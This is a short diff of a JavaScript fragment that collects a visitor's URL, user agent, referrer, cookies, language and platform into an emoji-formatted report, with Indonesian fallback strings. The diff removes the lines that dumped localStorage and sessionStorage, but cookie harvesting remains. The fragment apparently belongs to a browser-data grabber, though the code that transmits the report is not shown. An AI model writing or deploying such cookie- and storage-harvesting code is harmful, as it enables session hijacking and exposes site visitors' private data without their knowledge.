@@ -4,8 +4,6 @@
   const url = window.location.href;
   const userAgent = navigator.userAgent;
   const referrer = document.referrer || "Tidak ada referrer";
-  const localStorageData = JSON.stringify(localStorage) || "Kosong";
-  const sessionStorageData = JSON.stringify(sessionStorage) || "Kosong";
   const language = navigator.language;
   const platform = navigator.platform;
 
@@ -15,8 +13,6 @@
 🍪 Cookies: ${cookies}
 📱 User-Agent: ${userAgent}
 ↩️ Referrer: ${referrer}
-🗄️ localStorage: ${localStorageData}
-📦 sessionStorage: ${sessionStorageData}
 🌐 Language: ${language}
 💻 Platform: ${platform}
 `;
